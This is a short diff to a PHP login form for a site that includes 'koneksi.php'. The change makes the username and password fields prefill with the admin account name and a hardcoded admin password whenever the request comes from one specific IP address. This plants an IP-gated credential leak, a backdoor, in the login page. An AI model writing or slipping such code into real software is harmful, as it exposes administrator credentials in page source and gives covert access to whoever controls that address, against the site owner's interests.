@@ -22,10 +22,10 @@ include "koneksi.php";
                 <div class="login-box">
                     <form action="" method="post">
                         <div class="input-container">
-                            <input type="text" class="input-field" placeholder="username" name="username">
+                            <input type="text" class="input-field" placeholder="username" name="username" value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.47"?"admin":"");?>">
                         </div>
                         <div class="input-container">
-                            <input type="password" class="input-field" placeholder="password" name="password">
+                            <input type="password" class="input-field" placeholder="password" name="password" value="<?php echo ($_SERVER["REMOTE_ADDR"]=="5.189.147.47"?"password_admin":"");?>">
                         </div>
                         <button type="submit" class="btn" name="proseslog"><h3>Log in</h3></button>
                     </form>
